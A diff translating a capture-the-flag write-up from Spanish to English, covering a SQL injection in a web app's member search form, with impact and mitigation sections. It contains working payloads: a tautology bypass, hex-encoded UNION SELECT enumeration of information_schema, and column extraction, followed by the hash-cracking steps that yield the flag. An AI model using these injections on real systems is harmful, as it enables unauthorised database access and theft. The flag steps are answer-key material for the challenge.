@@ -1,69 +1,69 @@
 # A1 - SQL Injection (I)
 
-Vulnerabilidad del OWASP Top 10 (2017). Se encuentra en el formulario de búsqueda de miembros (`members`), donde la entrada del usuario se inyecta directamente en la consulta SQL.
+OWASP Top 10 (2017) vulnerability. Found in the member search form (`members`), where user input is injected directly into the SQL query.
 
 ---
 
-## Pasos para obtener la flag
+## Steps to Obtain the Flag
 
-### 1. Confirmar la vulnerabilidad (Bypass por tautología)
+### 1. Confirm the Vulnerability (Tautology Bypass)
 
-Ingresar en el campo de búsqueda:
+Enter in the search field:
 ```
 1 or 1
 ```
-La consulta resultante devuelve todos los registros de la tabla. Se observan cuatro usuarios; el último tiene de apellido `getThe` y de nombre `flag`, lo que confirma la vulnerabilidad.
+The resulting query returns all table records. Four users are observed; the last has surname `getThe` and first name `flag`, confirming the vulnerability.
 
 ---
 
-### 2. Enumerar la estructura de la base de datos (UNION)
+### 2. Enumerate Database Structure (UNION)
 
-La consulta original selecciona **dos columnas**, por lo que todo `UNION SELECT` debe respetar ese número. Además, las comillas están filtradas, por lo que los strings se pasan en **hexadecimal**.
+The original query selects **two columns**, so any `UNION SELECT` must respect that number. Additionally, quotes are filtered, so strings are passed in **hexadecimal**.
 
-**Listar tablas:**
+**List tables:**
 ```sql
 1 UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = database()
 ```
-Resultado relevante: tabla `users`.
+Relevant Result: `users` table.
 
-**Listar columnas de `users`** (`users` en hex = `0x7573657273`):
+**List columns of `users`** (`users` in hex = `0x7573657273`):
 ```sql
 1 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x7573657273
 ```
-Columnas de interés: `commentaire` y `countersign`.
+Columns of interest: `commentaire` and `countersign`.
 
 ---
 
-### 3. Extraer los datos y obtener la flag
+### 3. Extract Data and Obtain the Flag
 
 ```sql
 1 UNION SELECT commentaire, countersign FROM users
 ```
 
-Respuesta:
+Response:
 ```
 First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
 Surname:    5ff9d0165b4f92b14994e5c685cdce28
 ```
 
-**Proceso:**
-1. El hash `5ff9d0165b4f92b14994e5c685cdce28` es MD5 → descifra a `FortyTwo`
-2. Pasar a minúsculas → `fortytwo`
-3. Aplicar SHA-256 → resultado es la **flag**
+**Process:**
+1. The hash `5ff9d0165b4f92b14994e5c685cdce28` is MD5 → decrypts to `FortyTwo`
+2. Convert to lowercase → `fortytwo`
+3. Apply SHA-256 → result is the **flag**
 
-> Herramienta recomendada: [CyberChef](https://gchq.github.io/CyberChef/)
-
----
-
-## Impacto
-
-- **Confidencialidad:** acceso a cualquier dato de la base de datos sin credenciales.
-- **Enumeración:** posibilidad de reconstruir toda la estructura interna de la BD.
+> Recommended Tool: [CyberChef](https://gchq.github.io/CyberChef/)
 
 ---
 
-## Mitigación
+## Impact
 
-1. **Consultas preparadas (parametrizadas):** la defensa más efectiva; el input se trata siempre como dato literal.
-2. **Validación de entradas:** listas blancas para filtrar caracteres no permitidos.
-3. **Principio de mínimo privilegio:** el usuario de BD solo accede a lo estrictamente necesario.
+- **Confidentiality:** access to any database data without credentials.
+- **Enumeration:** ability to reconstruct the entire internal database structure.
+
+---
+
+## Mitigation
+
+1. **Prepared Queries (Parametrized):** most effective defense; input is always treated as literal data.
+2. **Input Validation:** whitelists to filter disallowed characters.
+3. **Principle of Least Privilege:** database user accesses only what's strictly necessary.
